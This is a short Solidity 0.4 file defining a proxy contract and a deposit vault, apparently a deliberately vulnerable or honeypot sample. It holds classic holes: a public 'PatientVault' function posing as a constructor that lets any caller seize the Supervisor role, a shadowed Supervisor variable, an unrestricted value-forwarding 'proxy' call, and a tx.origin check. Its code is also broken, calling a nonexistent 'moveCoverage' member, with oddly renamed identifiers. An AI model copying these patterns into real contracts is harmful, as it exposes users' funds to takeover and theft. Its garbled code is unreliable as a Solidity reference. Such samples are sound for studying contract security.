// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyCoordinator { if (msg.sender == Supervisor) _; } address Supervisor = msg.sender;
    function movecoverageCoordinator(address _coordinator) public onlyCoordinator { Supervisor = _coordinator; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract PatientvaultProxy is Proxy {
    address public Supervisor;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function PatientVault() public payable {
        if (msg.sender == tx.origin) {
            Supervisor = msg.sender;
            depositBenefit();
        }
    }

    function depositBenefit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdrawFunds(uint256 amount) public onlyCoordinator {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.moveCoverage(amount);
        }
    }
}